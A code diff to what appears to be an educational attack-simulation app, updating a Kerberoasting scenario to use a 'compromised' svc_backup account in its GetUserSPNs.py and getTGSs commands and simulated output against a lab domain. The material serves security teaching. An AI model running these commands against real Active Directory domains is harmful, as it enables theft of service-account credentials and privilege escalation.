@@ -34,21 +34,23 @@ export const kerberoastScenario = {
 4. Crack the tickets offline using a password dictionary
 
 **Why This Matters:**
-Service accounts often have weak passwords and high privileges. Kerberoasting can quickly identify and compromise these accounts, leading to lateral movement and privilege escalation.`,
+Service accounts often have weak passwords and high privileges. Kerberoasting can quickly identify and compromise these accounts, leading to lateral movement and privilege escalation.
+    
+**Note:** This scenario assumes you have compromised the 'svc_backup' credentials from the AS-REP Roasting mission.`,
 
     steps: [
       {
         number: 1,
         title: 'Enumerate Service Accounts',
-        description: 'Use LDAP queries to find all accounts with Service Principal Names (SPNs). These are service accounts that can be targeted.',
-        command: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/admin:Password123',
+        description: 'Use the compromised "svc_backup" account to run an LDAP query and find all accounts with Service Principal Names (SPNs).',
+        command: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/svc_backup:BackupPass123',
         tip: 'SPNs identify service accounts that run services like SQL Server, Exchange, or custom applications'
       },
       {
         number: 2,
         title: 'Request Service Tickets',
-        description: 'Request Kerberos service tickets (TGS) for each SPN found. These tickets contain encrypted credentials.',
-        command: 'impacket-getTGSs -request contoso.local/admin:Password123 -spn MSSQLSvc/SQL01.contoso.local',
+        description: 'Using the "svc_backup" credentials, request Kerberos service tickets (TGS) for each SPN found.',
+        command: 'impacket-getTGSs -request contoso.local/svc_backup:BackupPass123 -spn MSSQLSvc/SQL01.contoso.local',
         tip: 'The TGS ticket is encrypted with the service account\'s password hash, making it crackable offline'
       },
       {
@@ -78,7 +80,7 @@ Service accounts often have weak passwords and high privileges. Kerberoasting ca
   steps: [
     {
       id: 1,
-      expectedCommand: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/admin:Password123',
+      expectedCommand: 'GetUserSPNs.py -request -dc-ip 10.0.1.10 contoso.local/svc_backup:BackupPass123',
       attackerOutput: [
         '[*] Enumerating Service Principal Names (SPNs)...',
         '[*] Connecting to DC01.contoso.local (10.0.1.10)',
@@ -108,10 +110,10 @@ Service accounts often have weak passwords and high privileges. Kerberoasting ca
     },
     {
       id: 2,
-      expectedCommand: 'impacket-getTGSs -request contoso.local/admin:Password123 -spn MSSQLSvc/SQL01.contoso.local',
+      expectedCommand: 'impacket-getTGSs -request contoso.local/svc_backup:BackupPass123 -spn MSSQLSvc/SQL01.contoso.local',
       attackerOutput: [
         '[*] Requesting TGS for MSSQLSvc/SQL01.contoso.local...',
-        '[*] Using credentials: admin@contoso.local',
+        '[*] Using credentials: svc_backup@contoso.local',
         '[*] Connecting to KDC...',
         '[+] TGS request successful',
         '[+] Received TGS ticket for sqlservice',
